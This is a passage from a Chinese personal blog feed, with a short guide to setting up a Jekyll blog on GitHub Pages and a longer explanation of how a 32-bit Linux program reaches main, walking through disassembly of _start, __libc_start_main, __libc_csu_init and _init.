class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jekyll new blog</span><br><span class="line">cd blog</span><br><span class="line">jekyll serve</span><br></pre></td></tr></table></figure><p>测试成功即可</p><h1 id="0x02-选择主题"><a href="#0x02-选择主题" class="headerlink" title="0x02 选择主题"></a>0x02 选择主题</h1><p>我选择的是这个主题<a href="https://github.com/Huxpro/huxpro.github.io" target="_blank" rel="noopener">Huxpro/huxpro.github.io: My Blog / Jekyll Themes / PWA</a></p><p>直接下载源码解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bundle install</span><br><span class="line">jekyll serve</span><br></pre></td></tr></table></figure><p>写文章的话就在post目录下写</p><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jekyll build</span><br></pre></td></tr></table></figure><h1 id="0x03-github-pages"><a href="#0x03-github-pages" class="headerlink" title="0x03 github pages"></a>0x03 github pages</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir pz1o.github.io</span><br><span class="line">git init pz1o.github.io</span><br><span class="line">cd pz1o.github.io</span><br></pre></td></tr></table></figure><p>创建gemfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source &#39;https:&#x2F;&#x2F;rubygems.org&#39;</span><br><span class="line">gem &#39;github-pages&#39;, group: :jekyll_plugins</span><br></pre></td></tr></table></figure><p>此外还可以换源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundle config mirror.https:&#x2F;&#x2F;rubygems.org https:&#x2F;&#x2F;ruby.taobao.org</span><br></pre></td></tr></table></figure><p>如何提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#绑定远程仓库</span><br><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;Pz1o&#x2F;Pz1o.github.io.git</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;&quot;</span><br><span class="line">git push origin master -f</span><br><span class="line"></span><br><span class="line">#解决每次push得输入密码的问题</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@github.com:Pz1o&#x2F;Pz1o.github.io.git</span><br><span class="line">git push origin master -f</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;吃饱了撑的，我要换blog&lt;/p&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>file system</title>
    <link href="https://pz1o.top/2021/06/03/file-system/"/>
    <id>https://pz1o.top/2021/06/03/file-system/</id>
    <published>2021-06-03T09:32:47.000Z</published>
    <updated>2021-06-03T12:22:01.130Z</updated>
    
    
    
    
    
    <category term="kernel" scheme="https://pz1o.top/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>Linux x86 Program</title>
    <link href="https://pz1o.top/2021/06/02/Linux-x86-Program/"/>
    <id>https://pz1o.top/2021/06/02/Linux-x86-Program/</id>
    <published>2021-06-02T12:19:10.000Z</published>
    <updated>2021-06-09T11:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-x86-Program-Start-Up"><a href="#Linux-x86-Program-Start-Up" class="headerlink" title="Linux x86 Program Start Up"></a>Linux x86 Program Start Up</h1><p>我们只关注x86的程序</p><a id="more"></a><p><img src="/2021/06/02/Linux-x86-Program/callgraph.png" alt="image of the callgraph for all the routines involved in program startup on linux"></p><h2 id="0x01-how-did-we-get-to-main"><a href="#0x01-how-did-we-get-to-main" class="headerlink" title="0x01 how did we get to main?"></a>0x01 how did we get to main?</h2><p>我们可以先写一个空主函数，看一下其中的汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -g main.c -m32 -o main</span><br><span class="line">objdump -d main -M intel &gt; main.dump</span><br></pre></td></tr></table></figure><h2 id="0x02-But-first-how-do-we-get-to-start"><a href="#0x02-But-first-how-do-we-get-to-start" class="headerlink" title="0x02 But first, how do we get to _start?"></a>0x02 But first, how do we get to _start?</h2><p>当执行一个程序时，shell会调用linux下的系统函数exceve()。系统将会设置一个栈，将<code>argc</code> <code>argv</code> <code>envp</code>压入栈中。之后加载器重定位，预初始化函数。</p><p>当一切任务完毕后，通过调用<code>_start()</code>将控制权交给你的程序。</p><p>这里有<code>_start()</code>反汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">080482e0 &lt;_start&gt;:</span><br><span class="line"> 80482e0:31 ed                xor    ebp,ebp</span><br><span class="line"> 80482e2:5e                   pop    esi</span><br><span class="line"> 80482e3:89 e1                mov    ecx,esp</span><br><span class="line"> 80482e5:83 e4 f0             and    esp,0xfffffff0</span><br><span class="line"> 80482e8:50                   push   eax</span><br><span class="line"> 80482e9:54                   push   esp</span><br><span class="line"> 80482ea:52                   push   edx</span><br><span class="line"> 80482eb:68 50 84 04 08       push   0x8048450</span><br><span class="line"> 80482f0:68 f0 83 04 08       push   0x80483f0</span><br><span class="line"> 80482f5:51                   push   ecx</span><br><span class="line"> 80482f6:56                   push   esi</span><br><span class="line"> 80482f7:68 db 83 04 08       push   0x80483db</span><br><span class="line"> 80482fc:e8 bf ff ff ff       call   80482c0 &lt;__libc_start_main@plt&gt;</span><br><span class="line"> 8048301:f4                   hlt    ;stop</span><br><span class="line"> 8048302:66 90                xchg   ax,ax</span><br><span class="line"> 8048304:66 90                xchg   ax,ax</span><br><span class="line"> 8048306:66 90                xchg   ax,ax</span><br><span class="line"> 8048308:66 90                xchg   ax,ax</span><br><span class="line"> 804830a:66 90                xchg   ax,ax</span><br><span class="line"> 804830c:66 90                xchg   ax,ax</span><br><span class="line"> 804830e:66 90                xchg   ax,ax</span><br></pre></td></tr></table></figure><p>xor就是将ebp置为0。接下来，从栈中弹出栈顶的值到esi中。最开始时，我们把<code>argc</code> <code>argv</code> <code>envp</code>放入了栈里，所以现在就把<code>argc</code>放到<code>esi</code>中。因为弹出了参数，所以现在esp指向<code>argv</code>。</p><p>之后将esp的值放入ecx中，并且让esp进行<code>and</code>操作，清除后四位。</p><blockquote><p>为什么要这么做？</p><p>这么做，可以让esp下降0-15个字节，保证栈指针时16字节偶数对齐。对齐是为了保证栈上的所有变量能被内存和cache的快速访问。这里提到了SSE，就是指令都能在单精度浮点数组上工作的那个（扩展指令集）。</p><p>举个栗子：</p><p>比如<code>_start</code>的入口是0xbffff770,当我们将<code>argc</code>弹出栈时，esp就变成了0xbffff774。它变到了高地址。当进行完and操作后，就又变成了原来的值，指向了0xbffff770。</p></blockquote><h2 id="0x03-Now-set-up-for-calling-libc-start-main"><a href="#0x03-Now-set-up-for-calling-libc-start-main" class="headerlink" title="0x03 Now set up for calling __libc_start_main"></a>0x03 Now set up for calling __libc_start_main</h2><p>现在我们将把<code>__libc_start_main</code>的参数压入栈中。第一个eax，其实是一个垃圾参数，我们这样做的目的是使16字节对齐。除此之外没有其他用处。</p><p><code>__libc_start_main</code>原函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">    <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">    <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure><p>我们让<code>_start</code>函数把<code>__libc_start_main</code>的参数逆序压入栈中。</p><div class="table-container"><table><thead><tr><th>值</th><th>参数</th><th>内容</th></tr></thead><tbody><tr><td>eax</td><td>无</td><td>无</td></tr><tr><td>esp</td><td>void (* stack_end)</td><td>已被对齐的栈指针</td></tr><tr><td>edx</td><td>void (*rtld_fini) (void)</td><td>加载器传到edx中的动态链接器的析构函数。<br>被<strong>libc_start_main函数通过</strong>cxat_exit()注册，<br>为我们已经加载的动态库调用FINI section</td></tr><tr><td>0x8048450</td><td>void (*fini) (void)</td><td><strong>libc_csu_fini——程序的析构函数。<br>被</strong>libc_start_main 通过 __cxat_exit()注册</td></tr><tr><td>0x80483f0</td><td>void (*init) (void)</td><td><strong>libc_csu_init——程序的构造函数。<br>于main函数之前被</strong>libc_start_main函数调用</td></tr><tr><td>ecx</td><td>char <em> </em> ubp_av</td><td>argv相对栈的偏移值</td></tr><tr><td>esi</td><td>int argc</td><td>argc相对栈的偏移值</td></tr><tr><td>0x80483db</td><td>int (<em>main) (int, char </em> <em>, char </em> *)</td><td>我们程序的main函数，被__libc_start_main函数调用<br>main函数的返回值被传递给exit()函数，用于终结我们的程序</td></tr></tbody></table></div><p><code>__libc_csu_init</code>接下来我们会看</p><h2 id="0x04-Hey-Where’s-the-environment-variables"><a href="#0x04-Hey-Where’s-the-environment-variables" class="headerlink" title="0x04 Hey! Where’s the environment variables?"></a>0x04 Hey! Where’s the environment variables?</h2><p>分析到这，我们发现一个问题，我们的envp去哪里了，它不是<code>__libc_start_main</code>中的一个参数。但是在main函数里面调用了envp<code>int main(int argc, char** argv, char** envp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_init_first(<span class="keyword">int</span> argc, <span class="keyword">char</span> *arg0, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> **argv = &amp;arg0, **envp = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">    __environ = envp;</span><br><span class="line">    __libc_init (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>事实上，<code>__libc_start_main</code>调用了<code>__libc_init_first</code>，这个函数会用内部信息找到环境变量，（事实上，环境变量就在argv的终止字符NULL的后面）。然后设置一个全局变量<code>__environ</code>，这个全局变量可以被<code>__libc_start_main</code>函数内部任何地方调用，包括调用main函数。</strong></p><p>当<code>envp</code>建立了之后，<code>__libc_start_main</code>函数会使用相同的小技巧，越过<code>envp</code>数组之后的<code>NULL</code>字符，获取另一个向量——ELF辅助向量（加载器使用它给进程传递一些信息）。通过一个简单的方法可以查看里面的内容：运行程序前，设置环境变量LD_SHOW_AUXV=1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">❯ LD_SHOW_AUXV&#x3D;1 .&#x2F;main</span><br><span class="line">AT_SYSINFO:      0xf7f93fd0</span><br><span class="line">AT_SYSINFO_EHDR: 0xf7f93000</span><br><span class="line">AT_HWCAP:    fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss</span><br><span class="line">AT_PAGESZ:       4096</span><br><span class="line">AT_CLKTCK:       100</span><br><span class="line">AT_PHDR:         0x8048034</span><br><span class="line">AT_PHENT:        32</span><br><span class="line">AT_PHNUM:        9</span><br><span class="line">AT_BASE:         0xf7f95000</span><br><span class="line">AT_FLAGS:        0x0</span><br><span class="line">AT_ENTRY:        0x80482e0</span><br><span class="line">AT_UID:          1000</span><br><span class="line">AT_EUID:         1000</span><br><span class="line">AT_GID:          0</span><br><span class="line">AT_EGID:         0</span><br><span class="line">AT_SECURE:       0</span><br><span class="line">AT_RANDOM:       0xff828c2b</span><br><span class="line">AT_HWCAP2:       0x0</span><br><span class="line">AT_EXECFN:       .&#x2F;main</span><br><span class="line">AT_PLATFORM:     i686</span><br></pre></td></tr></table></figure><ul><li>AT_ENTRY：<code>_start</code>的地址</li><li>AT_UID/AT_EUID/AT_GID/AT_EGID：uid和euid gid和egid</li><li>AT_PHDR：ELF program 头的地址0x8048034</li><li>AT_PHENT：header entry的字节数</li></ul><h2 id="0x05-libc-start-main-in-general"><a href="#0x05-libc-start-main-in-general" class="headerlink" title="0x05 __libc_start_main in general"></a>0x05 __libc_start_main in general</h2><p>我们来了解一下<code>__libc_start_main</code>的细节，主要功能有以下：</p><ol><li>关注setuid和setgid的安全问题</li><li>启动线程</li><li>把<code>fini</code>函数和<code>rtld_fini</code>函数作为参数传递给<code>at_exit</code>调用，使它们在<code>at_exit</code>里被调用，从而完成用户程序和加载器的调用结束之后的清理工作</li><li>调用<code>init</code>的参数</li><li>将<code>argc</code>和<code>argv</code>参数传递给<code>main</code>，并调用<code>main</code>。当然我们也要把全局变量<code>__environ</code>传递</li><li>调用<code>exit</code>并且带有主函数的返回值</li></ol><p><strong>Calling the init argument</strong></p><p><code>__libc_start_main</code>的<code>init</code>的参数，是被设置为<code>__libc_csu_init</code>。</p><p>具体在源码csu/elf-init，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _init ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> <span class="built_in">size</span> = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-libc-csu-init-introduction"><a href="#0x06-libc-csu-init-introduction" class="headerlink" title="0x06 __libc_csu_init introduction"></a>0x06 __libc_csu_init introduction</h2><p><code>__libc_csu_init</code>是非常重要的函数，它是我们可执行程序的构造函数。</p><p>我们可能会有疑问对于构造和析构，说这是c++的东西。但是构造和析构的概念并不是c++的。</p><p>对于任意可执行程序都有一个构造函数<code>__libc_csu_init</code>和析构函数<code>__libc_csu_fini</code>。</p><p><strong>在构造函数的内部，可执行程序将会寻找全局C构造函数，并且调用他们。</strong></p><p>可能很难理解这个点，我们来看一下<code>__libc_csu_init</code>的反汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">080483f0 &lt;__libc_csu_init&gt;:</span><br><span class="line"> 80483f0:55                   push   ebp</span><br><span class="line"> 80483f1:57                   push   edi</span><br><span class="line"> 80483f2:56                   push   esi</span><br><span class="line"> 80483f3:53                   push   ebx</span><br><span class="line"> 80483f4:e8 17 ff ff ff       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 80483f9:81 c3 07 1c 00 00    add    ebx,0x1c07</span><br><span class="line"> 80483ff:83 ec 0c             sub    esp,0xc</span><br><span class="line"> 8048402:8b 6c 24 20          mov    ebp,DWORD PTR [esp+0x20]</span><br><span class="line"> 8048406:8d b3 0c ff ff ff    lea    esi,[ebx-0xf4]</span><br><span class="line"> 804840c:e8 7b fe ff ff       call   804828c &lt;_init&gt;</span><br><span class="line"> 8048411:8d 83 08 ff ff ff    lea    eax,[ebx-0xf8]</span><br><span class="line"> 8048417:29 c6                sub    esi,eax</span><br><span class="line"> 8048419:c1 fe 02             sar    esi,0x2</span><br><span class="line"> 804841c:85 f6                test   esi,esi</span><br><span class="line"> 804841e:74 25                je     8048445 &lt;__libc_csu_init+0x55&gt;</span><br><span class="line"> 8048420:31 ff                xor    edi,edi</span><br><span class="line"> 8048422:8d b6 00 00 00 00    lea    esi,[esi+0x0]</span><br><span class="line"> 8048428:83 ec 04             sub    esp,0x4</span><br><span class="line"> 804842b:ff 74 24 2c          push   DWORD PTR [esp+0x2c]</span><br><span class="line"> 804842f:ff 74 24 2c          push   DWORD PTR [esp+0x2c]</span><br><span class="line"> 8048433:55                   push   ebp</span><br><span class="line"> 8048434:ff 94 bb 08 ff ff ff call   DWORD PTR [ebx+edi*4-0xf8]</span><br><span class="line"> 804843b:83 c7 01             add    edi,0x1</span><br><span class="line"> 804843e:83 c4 10             add    esp,0x10</span><br><span class="line"> 8048441:39 f7                cmp    edi,esi</span><br><span class="line"> 8048443:75 e3                jne    8048428 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line"> 8048445:83 c4 0c             add    esp,0xc</span><br><span class="line"> 8048448:5b                   pop    ebx</span><br><span class="line"> 8048449:5e                   pop    esi</span><br><span class="line"> 804844a:5f                   pop    edi</span><br><span class="line"> 804844b:5d                   pop    ebp</span><br><span class="line"> 804844c:c3                   ret    </span><br><span class="line"> 804844d:8d 76 00             lea    esi,[esi+0x0]</span><br></pre></td></tr></table></figure><p><strong>What the heck is a thunk?</strong></p><p><code>get_pc_thunk</code>是给位置无关码使用的。通过它，我们可以使位置无关代码正常工作。</p><p>为了让他们工作，基址寄存器（ebp）需要知道<code>GLOBAL_OFFSET_TABLE</code></p><p>其中代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">08048310 &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line"> 8048310:8b 1c 24             mov    ebx,DWORD PTR [esp]</span><br><span class="line"> 8048313:c3                   ret</span><br><span class="line"></span><br><span class="line"> 80483f3:53                   push   ebx</span><br><span class="line"> 80483f4:e8 17 ff ff ff       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 80483f9:81 c3 07 1c 00 00    add    ebx,0x1c07;add  $_GLOBAL_OFFSET_TABLE_,%ebx</span><br></pre></td></tr></table></figure><p>我们可以看到，在调用<code>__get_pc_thunk_dx</code>后，将下一条指令压入了栈中。</p><p>在<code>__get_pc_thunk_dx</code>中，我们将返回地址从栈中赋值到ebx中，之后又就<code>_GLOBAL_OFFSET_TABLE_</code>加到<code>ebx</code>上去。<strong>其中<code>_GLOBAL_OFFSET_TABLE_</code>代表了当前地址和位置无关码使用的<code>GOT(global offset table)</code>的差值。</strong></p><blockquote><p>这里有-pic可以让编辑器直接给我们完成位置无关自动化。</p></blockquote><h2 id="0x07-init-gets-the-call"><a href="#0x07-init-gets-the-call" class="headerlink" title="0x07 _init gets the call"></a>0x07 _init gets the call</h2><p>我们来理一下流程，首先加载器将控制交给了<code>_start</code>，之后调用了<code>__libc_start_main</code>，然后又调用了<code>__libc_csu_init</code>，最后调用了<code>_init</code></p><p>来看一下<code>_init</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">;这里我和原文的不太一样，看原文的把</span><br><span class="line">;0804828c &lt;_init&gt;:</span><br><span class="line">; 804828c:53                   push   ebx</span><br><span class="line">; 804828d:83 ec 08             sub    esp,0x8</span><br><span class="line">; 8048290:e8 7b 00 00 00       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">; 8048295:81 c3 6b 1d 00 00    add    ebx,0x1d6b</span><br><span class="line">; 804829b:8b 83 fc ff ff ff    mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">; 80482a1:85 c0                test   eax,eax</span><br><span class="line">; 80482a3:74 05                je     80482aa &lt;_init+0x1e&gt;</span><br><span class="line">; 80482a5:e8 26 00 00 00       call   80482d0 &lt;__libc_start_main@plt+0x10&gt;</span><br><span class="line">; 80482aa:83 c4 08             add    esp,0x8</span><br><span class="line">; 80482ad:5b                   pop    ebx</span><br><span class="line">; 80482ae:c3                   ret</span><br><span class="line">08048274 &lt;_init&gt;:</span><br><span class="line"> 8048274:       55                      push   %ebp</span><br><span class="line"> 8048275:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048277:       53                      push   %ebx</span><br><span class="line"> 8048278:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 804827b:       e8 00 00 00 00          call   8048280 &lt;_init+0xc&gt;</span><br><span class="line"> 8048280:       5b                      pop    %ebx</span><br><span class="line"> 8048281:       81 c3 74 1d 00 00       add    $0x1d74,%ebx        (.got.plt)</span><br><span class="line"> 8048287:       8b 93 fc ff ff ff       mov    -0x4(%ebx),%edx</span><br><span class="line"> 804828d:       85 d2                   test   %edx,%edx</span><br><span class="line"> 804828f:       74 05                   je     8048296 &lt;_init+0x22&gt;</span><br><span class="line"> 8048291:       e8 1e 00 00 00          call   80482b4 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 8048296:       e8 d5 00 00 00          call   8048370 &lt;frame_dummy&gt;</span><br><span class="line"> 804829b:       e8 70 01 00 00          call   8048410 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 80482a0:       58                      pop    %eax</span><br><span class="line"> 80482a1:       5b                      pop    %ebx</span><br><span class="line"> 80482a2:       c9                      leave</span><br><span class="line"> 80482a3:       c3                      ret</span><br></pre></td></tr></table></figure><h3 id="1-It-starts-with-the-regular-C-calling-convention"><a href="#1-It-starts-with-the-regular-C-calling-convention" class="headerlink" title="1. It starts with the regular C calling convention"></a>1. It starts with the regular C calling convention</h3><p>和常规c函数调用一样，压栈，调ebp，之后就是和我们上面看见的一样。</p><p>call下一条指令，但同时也把下一条指令压入了栈中。这么做好像和我们顺序执行是一样的，但由于下一条指令的地址存到了ebx中。</p><p>之后，我们就可以通过ebx来访问全局访问表了。</p><h3 id="2-what-is-gmon-start"><a href="#2-what-is-gmon-start" class="headerlink" title="2. what is __gmon__start?"></a>2. what is __gmon__start?</h3><p>如果<code>__gmon_start</code>是空的，我们将跳过它，否则就用它来设置profiling。</p><p>该函数调用开始profiling，并且调用<code>at_exit</code>去调用另一个程序运行，并且在运行结束的时候生成gmon.out</p><h3 id="3-what-is-frame-dummy"><a href="#3-what-is-frame-dummy" class="headerlink" title="3. what is frame_dummy?"></a>3. what is frame_dummy?</h3><p>接下来我们将调用<code>frame_dummy</code>。这样做主要是为了调用<code>__register_fram_info</code>，但是这个被调用主要是为了设置参数。</p><p>这样设置的目的主要是为了在出错时设置unwinding stack frames。</p><h3 id="4-what-is-do-global-ctors-aux"><a href="#4-what-is-do-global-ctors-aux" class="headerlink" title="4. what is__do_global_ctors_aux?"></a>4. what is__do_global_ctors_aux?</h3><p>我们终于看到了__do_global_ctors_aux函数。如果在main函数开始前就发生了错误，我们就得看这个函数了。</p><p>当然，这里面有全局C++对象的构造函数。</p><p><strong>举个例子</strong></p><p>写个prog。<code>__attribute__((constructor))</code>告诉gcc，链接器应该在<code>__do_global_ctors_aux</code>使用的表里创建一个指针指向这里。</p><blockquote><p><code>__attribute__((constructor))</code>就是先在主函数执行前，执行构造函数。</p><p><code>__FUNCTION__</code>是函数的名字。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//prog.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((constructor)) a_constructor() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,__FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;Desktop&#x2F;main                                                                 </span><br><span class="line">▶ .&#x2F;prog</span><br><span class="line">a_constructor</span><br><span class="line">main</span><br></pre></td></tr></table></figure><p>反汇编一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048290 &lt;_init&gt;:</span><br><span class="line"> 8048290:       55                      push   %ebp</span><br><span class="line"> 8048291:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048293:       53                      push   %ebx</span><br><span class="line"> 8048294:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 8048297:       e8 00 00 00 00          call   804829c &lt;_init+0xc&gt;</span><br><span class="line"> 804829c:       5b                      pop    %ebx</span><br><span class="line"> 804829d:       81 c3 58 1d 00 00       add    $0x1d58,%ebx</span><br><span class="line"> 80482a3:       8b 93 fc ff ff ff       mov    -0x4(%ebx),%edx</span><br><span class="line"> 80482a9:       85 d2                   test   %edx,%edx</span><br><span class="line"> 80482ab:       74 05                   je     80482b2 &lt;_init+0x22&gt;</span><br><span class="line"> 80482ad:       e8 1e 00 00 00          call   80482d0 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 80482b2:       e8 d9 00 00 00          call   8048390 &lt;frame_dummy&gt;</span><br><span class="line"> 80482b7:       e8 94 01 00 00          call   8048450 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 80482bc:       58                      pop    %eax</span><br><span class="line"> 80482bd:       5b                      pop    %ebx</span><br><span class="line"> 80482be:       c9                      leave</span><br><span class="line"> 80482bf:       c3                      